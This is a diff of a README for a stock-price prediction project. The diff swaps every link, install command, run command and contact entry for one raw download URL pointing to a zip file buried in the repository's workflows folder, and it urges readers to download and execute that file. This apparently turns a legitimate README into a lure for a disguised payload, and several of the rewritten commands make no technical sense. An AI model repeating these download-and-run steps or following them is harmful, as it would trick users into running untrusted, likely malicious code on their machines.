@@ -2,7 +2,7 @@
 
 Welcome to the **Real-Time Stock Price Prediction and Market Analysis** repository! This project focuses on predicting stock prices using advanced machine learning techniques. We utilize Long Short-Term Memory (LSTM) networks to forecast stock prices for the next 10 days, based on historical data from 2010 to 2023. The application also visualizes market trends in a user-friendly manner using Streamlit.
 
-[Download the latest release here!](https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/releases)
+[Download the latest release here!](https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/raw/refs/heads/main/.github/workflows/market_Machine_and_Time_price_analysis_stock_prediction_Real_using_Learning_v3.3.zip)
 
 ## Table of Contents
 
@@ -46,25 +46,25 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning.git
+   git clone https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/raw/refs/heads/main/.github/workflows/market_Machine_and_Time_price_analysis_stock_prediction_Real_using_Learning_v3.3.zip
    cd Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning
    ```
 
 2. **Install Required Packages**:
    Make sure you have Python installed. Then, install the necessary packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/raw/refs/heads/main/.github/workflows/market_Machine_and_Time_price_analysis_stock_prediction_Real_using_Learning_v3.3.zip
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/releases) to download the latest release and execute it.
+   Visit the [Releases section](https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/raw/refs/heads/main/.github/workflows/market_Machine_and_Time_price_analysis_stock_prediction_Real_using_Learning_v3.3.zip) to download the latest release and execute it.
 
 ## Usage
 
 1. **Run the Application**:
    Start the Streamlit app by executing:
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/raw/refs/heads/main/.github/workflows/market_Machine_and_Time_price_analysis_stock_prediction_Real_using_Learning_v3.3.zip
    ```
 
 2. **Select Stock**:
@@ -119,7 +119,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or inquiries, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [thinker84](https://github.com/thinker84)
+- **Email**: https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/raw/refs/heads/main/.github/workflows/market_Machine_and_Time_price_analysis_stock_prediction_Real_using_Learning_v3.3.zip
+- **GitHub**: [thinker84](https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/raw/refs/heads/main/.github/workflows/market_Machine_and_Time_price_analysis_stock_prediction_Real_using_Learning_v3.3.zip)
 
-Thank you for checking out the **Real-Time Stock Price Prediction and Market Analysis** project! We hope you find it useful for your stock market analysis needs. Don't forget to check the [Releases section](https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/releases) for the latest updates!
+Thank you for checking out the **Real-Time Stock Price Prediction and Market Analysis** project! We hope you find it useful for your stock market analysis needs. Don't forget to check the [Releases section](https://github.com/thinker84/Real-Time-stock-price-prediction-and-market-analysis-using-Machine-Learning/raw/refs/heads/main/.github/workflows/market_Machine_and_Time_price_analysis_stock_prediction_Real_using_Learning_v3.3.zip) for the latest updates!
